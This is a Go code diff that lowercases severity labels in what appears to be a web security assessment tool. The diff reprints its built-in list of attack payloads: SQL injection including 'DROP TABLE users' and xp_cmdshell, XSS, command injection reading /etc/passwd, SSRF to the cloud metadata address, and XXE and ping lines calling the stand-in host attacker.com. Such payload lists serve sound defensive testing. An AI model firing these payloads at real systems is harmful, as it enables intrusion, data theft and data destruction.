@@ -402,7 +402,7 @@ func (a *Assessment) loadUnifiedAttackPayloads() []AttackPayload {
 	for i, up := range unified {
 		severity := up.Severity
 		if severity == "" {
-			severity = "Medium"
+			severity = "medium"
 		}
 		location := "query"
 		lc := strings.ToLower(up.Category)
@@ -725,69 +725,69 @@ func (a *Assessment) GetBenignResults() []metrics.BenignResult {
 func getBuiltinAttackPayloads() []AttackPayload {
 	payloads := []AttackPayload{
 		// SQL Injection
-		{ID: "sqli-1", Category: "sqli", Severity: "Critical", Payload: "' OR '1'='1", Location: "query"},
-		{ID: "sqli-2", Category: "sqli", Severity: "Critical", Payload: "1; DROP TABLE users--", Location: "query"},
-		{ID: "sqli-3", Category: "sqli", Severity: "Critical", Payload: "' UNION SELECT * FROM users--", Location: "query"},
-		{ID: "sqli-4", Category: "sqli", Severity: "Critical", Payload: "1' AND '1'='1", Location: "query"},
-		{ID: "sqli-5", Category: "sqli", Severity: "Critical", Payload: "'; EXEC xp_cmdshell('dir')--", Location: "query"},
-		{ID: "sqli-6", Category: "sqli", Severity: "High", Payload: "1 OR 1=1", Location: "query"},
-		{ID: "sqli-7", Category: "sqli", Severity: "High", Payload: "admin'--", Location: "query"},
-		{ID: "sqli-8", Category: "sqli", Severity: "High", Payload: "' OR ''='", Location: "query"},
-		{ID: "sqli-9", Category: "sqli", Severity: "Medium", Payload: "1' ORDER BY 10--", Location: "query"},
-		{ID: "sqli-10", Category: "sqli", Severity: "Medium", Payload: "1' WAITFOR DELAY '0:0:5'--", Location: "query"},
+		{ID: "sqli-1", Category: "sqli", Severity: "critical", Payload: "' OR '1'='1", Location: "query"},
+		{ID: "sqli-2", Category: "sqli", Severity: "critical", Payload: "1; DROP TABLE users--", Location: "query"},
+		{ID: "sqli-3", Category: "sqli", Severity: "critical", Payload: "' UNION SELECT * FROM users--", Location: "query"},
+		{ID: "sqli-4", Category: "sqli", Severity: "critical", Payload: "1' AND '1'='1", Location: "query"},
+		{ID: "sqli-5", Category: "sqli", Severity: "critical", Payload: "'; EXEC xp_cmdshell('dir')--", Location: "query"},
+		{ID: "sqli-6", Category: "sqli", Severity: "high", Payload: "1 OR 1=1", Location: "query"},
+		{ID: "sqli-7", Category: "sqli", Severity: "high", Payload: "admin'--", Location: "query"},
+		{ID: "sqli-8", Category: "sqli", Severity: "high", Payload: "' OR ''='", Location: "query"},
+		{ID: "sqli-9", Category: "sqli", Severity: "medium", Payload: "1' ORDER BY 10--", Location: "query"},
+		{ID: "sqli-10", Category: "sqli", Severity: "medium", Payload: "1' WAITFOR DELAY '0:0:5'--", Location: "query"},
 
 		// XSS
-		{ID: "xss-1", Category: "xss", Severity: "High", Payload: "<script>alert('XSS')</script>", Location: "query"},
-		{ID: "xss-2", Category: "xss", Severity: "High", Payload: "<img src=x onerror=alert(1)>", Location: "query"},
-		{ID: "xss-3", Category: "xss", Severity: "High", Payload: "javascript:alert(1)", Location: "query"},
-		{ID: "xss-4", Category: "xss", Severity: "High", Payload: "<svg onload=alert(1)>", Location: "query"},
-		{ID: "xss-5", Category: "xss", Severity: "Medium", Payload: "'\"><script>alert(1)</script>", Location: "query"},
-		{ID: "xss-6", Category: "xss", Severity: "Medium", Payload: "<body onload=alert(1)>", Location: "query"},
-		{ID: "xss-7", Category: "xss", Severity: "Medium", Payload: "<iframe src='javascript:alert(1)'>", Location: "query"},
-		{ID: "xss-8", Category: "xss", Severity: "Medium", Payload: "<input onfocus=alert(1) autofocus>", Location: "query"},
+		{ID: "xss-1", Category: "xss", Severity: "high", Payload: "<script>alert('XSS')</script>", Location: "query"},
+		{ID: "xss-2", Category: "xss", Severity: "high", Payload: "<img src=x onerror=alert(1)>", Location: "query"},
+		{ID: "xss-3", Category: "xss", Severity: "high", Payload: "javascript:alert(1)", Location: "query"},
+		{ID: "xss-4", Category: "xss", Severity: "high", Payload: "<svg onload=alert(1)>", Location: "query"},
+		{ID: "xss-5", Category: "xss", Severity: "medium", Payload: "'\"><script>alert(1)</script>", Location: "query"},
+		{ID: "xss-6", Category: "xss", Severity: "medium", Payload: "<body onload=alert(1)>", Location: "query"},
+		{ID: "xss-7", Category: "xss", Severity: "medium", Payload: "<iframe src='javascript:alert(1)'>", Location: "query"},
+		{ID: "xss-8", Category: "xss", Severity: "medium", Payload: "<input onfocus=alert(1) autofocus>", Location: "query"},
 
 		// Command Injection
-		{ID: "cmdi-1", Category: "cmdi", Severity: "Critical", Payload: "; cat /etc/passwd", Location: "query"},
-		{ID: "cmdi-2", Category: "cmdi", Severity: "Critical", Payload: "| ls -la", Location: "query"},
-		{ID: "cmdi-3", Category: "cmdi", Severity: "Critical", Payload: "`id`", Location: "query"},
-		{ID: "cmdi-4", Category: "cmdi", Severity: "Critical", Payload: "$(whoami)", Location: "query"},
-		{ID: "cmdi-5", Category: "cmdi", Severity: "High", Payload: "&& cat /etc/passwd", Location: "query"},
-		{ID: "cmdi-6", Category: "cmdi", Severity: "High", Payload: "|| ping -c 5 attacker.com", Location: "query"},
+		{ID: "cmdi-1", Category: "cmdi", Severity: "critical", Payload: "; cat /etc/passwd", Location: "query"},
+		{ID: "cmdi-2", Category: "cmdi", Severity: "critical", Payload: "| ls -la", Location: "query"},
+		{ID: "cmdi-3", Category: "cmdi", Severity: "critical", Payload: "`id`", Location: "query"},
+		{ID: "cmdi-4", Category: "cmdi", Severity: "critical", Payload: "$(whoami)", Location: "query"},
+		{ID: "cmdi-5", Category: "cmdi", Severity: "high", Payload: "&& cat /etc/passwd", Location: "query"},
+		{ID: "cmdi-6", Category: "cmdi", Severity: "high", Payload: "|| ping -c 5 attacker.com", Location: "query"},
 
 		// Path Traversal
-		{ID: "traversal-1", Category: "traversal", Severity: "High", Payload: "../../../etc/passwd", Location: "query"},
-		{ID: "traversal-2", Category: "traversal", Severity: "High", Payload: "....//....//....//etc/passwd", Location: "query"},
-		{ID: "traversal-3", Category: "traversal", Severity: "High", Payload: "..%2F..%2F..%2Fetc%2Fpasswd", Location: "query"},
-		{ID: "traversal-4", Category: "traversal", Severity: "Medium", Payload: "/etc/passwd%00", Location: "query"},
-		{ID: "traversal-5", Category: "traversal", Severity: "Medium", Payload: "....\\....\\....\\windows\\system32\\config\\sam", Location: "query"},
+		{ID: "traversal-1", Category: "traversal", Severity: "high", Payload: "../../../etc/passwd", Location: "query"},
+		{ID: "traversal-2", Category: "traversal", Severity: "high", Payload: "....//....//....//etc/passwd", Location: "query"},
+		{ID: "traversal-3", Category: "traversal", Severity: "high", Payload: "..%2F..%2F..%2Fetc%2Fpasswd", Location: "query"},
+		{ID: "traversal-4", Category: "traversal", Severity: "medium", Payload: "/etc/passwd%00", Location: "query"},
+		{ID: "traversal-5", Category: "traversal", Severity: "medium", Payload: "....\\....\\....\\windows\\system32\\config\\sam", Location: "query"},
 
 		// SSRF
-		{ID: "ssrf-1", Category: "ssrf", Severity: "Critical", Payload: "http://169.254.169.254/latest/meta-data/", Location: "query"},
-		{ID: "ssrf-2", Category: "ssrf", Severity: "Critical", Payload: "http://localhost:22", Location: "query"},
-		{ID: "ssrf-3", Category: "ssrf", Severity: "High", Payload: "http://127.0.0.1/admin", Location: "query"},
-		{ID: "ssrf-4", Category: "ssrf", Severity: "High", Payload: "file:///etc/passwd", Location: "query"},
-		{ID: "ssrf-5", Category: "ssrf", Severity: "Medium", Payload: "http://[::]:22/", Location: "query"},
+		{ID: "ssrf-1", Category: "ssrf", Severity: "critical", Payload: "http://169.254.169.254/latest/meta-data/", Location: "query"},
+		{ID: "ssrf-2", Category: "ssrf", Severity: "critical", Payload: "http://localhost:22", Location: "query"},
+		{ID: "ssrf-3", Category: "ssrf", Severity: "high", Payload: "http://127.0.0.1/admin", Location: "query"},
+		{ID: "ssrf-4", Category: "ssrf", Severity: "high", Payload: "file:///etc/passwd", Location: "query"},
+		{ID: "ssrf-5", Category: "ssrf", Severity: "medium", Payload: "http://[::]:22/", Location: "query"},
 
 		// XXE
-		{ID: "xxe-1", Category: "xxe", Severity: "Critical", Payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", Location: "body"},
-		{ID: "xxe-2", Category: "xxe", Severity: "High", Payload: "<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">", Location: "body"},
+		{ID: "xxe-1", Category: "xxe", Severity: "critical", Payload: "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>", Location: "body"},
+		{ID: "xxe-2", Category: "xxe", Severity: "high", Payload: "<!ENTITY xxe SYSTEM \"http://attacker.com/xxe\">", Location: "body"},
 
 		// SSTI
-		{ID: "ssti-1", Category: "ssti", Severity: "Critical", Payload: "{{7*7}}", Location: "query"},
-		{ID: "ssti-2", Category: "ssti", Severity: "Critical", Payload: "${7*7}", Location: "query"},
-		{ID: "ssti-3", Category: "ssti", Severity: "High", Payload: "{{config}}", Location: "query"},
-		{ID: "ssti-4", Category: "ssti", Severity: "High", Payload: "<%= 7*7 %>", Location: "query"},
+		{ID: "ssti-1", Category: "ssti", Severity: "critical", Payload: "{{7*7}}", Location: "query"},
+		{ID: "ssti-2", Category: "ssti", Severity: "critical", Payload: "${7*7}", Location: "query"},
+		{ID: "ssti-3", Category: "ssti", Severity: "high", Payload: "{{config}}", Location: "query"},
+		{ID: "ssti-4", Category: "ssti", Severity: "high", Payload: "<%= 7*7 %>", Location: "query"},
 
 		// LDAP Injection
-		{ID: "ldap-1", Category: "ldap", Severity: "High", Payload: "*)(uid=*))(|(uid=*", Location: "query"},
-		{ID: "ldap-2", Category: "ldap", Severity: "High", Payload: "admin)(&)", Location: "query"},
+		{ID: "ldap-1", Category: "ldap", Severity: "high", Payload: "*)(uid=*))(|(uid=*", Location: "query"},
+		{ID: "ldap-2", Category: "ldap", Severity: "high", Payload: "admin)(&)", Location: "query"},
 
 		// Header Injection
-		{ID: "header-1", Category: "header", Severity: "Medium", Payload: "value\r\nX-Injected: header", Location: "header"},
-		{ID: "header-2", Category: "header", Severity: "Medium", Payload: "value%0d%0aX-Injected:%20header", Location: "header"},
+		{ID: "header-1", Category: "header", Severity: "medium", Payload: "value\r\nX-Injected: header", Location: "header"},
+		{ID: "header-2", Category: "header", Severity: "medium", Payload: "value%0d%0aX-Injected:%20header", Location: "header"},
 
 		// Log Injection
-		{ID: "log-1", Category: "log", Severity: "Low", Payload: "user\n[CRITICAL] Fake log entry", Location: "query"},
+		{ID: "log-1", Category: "log", Severity: "low", Payload: "user\n[CRITICAL] Fake log entry", Location: "query"},
 	}
 
 	return payloads
